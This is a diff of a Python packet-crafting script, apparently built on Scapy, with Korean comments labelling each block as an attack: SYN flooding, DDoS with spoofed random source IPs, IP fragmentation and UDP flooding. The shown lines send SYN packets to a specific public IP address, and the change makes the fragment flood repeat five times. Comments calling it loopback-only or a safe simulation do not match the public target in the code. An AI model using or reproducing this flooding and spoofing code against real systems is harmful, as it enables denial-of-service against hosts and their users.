@@ -9,7 +9,7 @@ packet = IP(dst="115.92.164.155") / TCP(dport=80, flags="S")
 for _ in range(100):
     send(packet)
 
-# 무작위 IP에 의한 디도스 공격
+#무작위 IP에 의한 디도스 공격
 import random
 
 def random_ip():
@@ -19,7 +19,7 @@ for _ in range(5):
     pkt = IP(src=src_ip, dst="115.92.164.155") / TCP(dport=80, flags="S")
     pkt.show()
 
-# 단편화 공격
+#단편화 공격
 import time
 
 # 로컬 루프백만 사용 (외부 전송 금지)
@@ -30,14 +30,15 @@ payload = b"A" * 4000
 
 ip = IP(dst=dst_ip, flags="MF") / ICMP() / payload
 
-# fragment 크기 지정 (예: 600바이트)
-fragments = fragment(ip, fragsize=600)
+# fragment 크기 지정 (예: 608바이트)
+fragments = fragment(ip, fragsize=608)
 
-for pkt in fragments:
-    send(pkt, verbose=False)
-    time.sleep(0.2)  # 과도한 전송 방지
+for _ in range(5):
+    for pkt in fragments:
+        send(pkt, verbose=False)
+        time.sleep(0.2)  # 과도한 전송 방지
 
-# UDP flooding 공격
+#UDP flooding 공격
 import socket
 import time
 
@@ -58,6 +59,7 @@ for i in range(TOTAL_PKTS):
 
 sock.close()
 print("Done (safe UDP traffic simulation)")
+
 
 # UDP를 무작위로 보내는 공격
 import socket
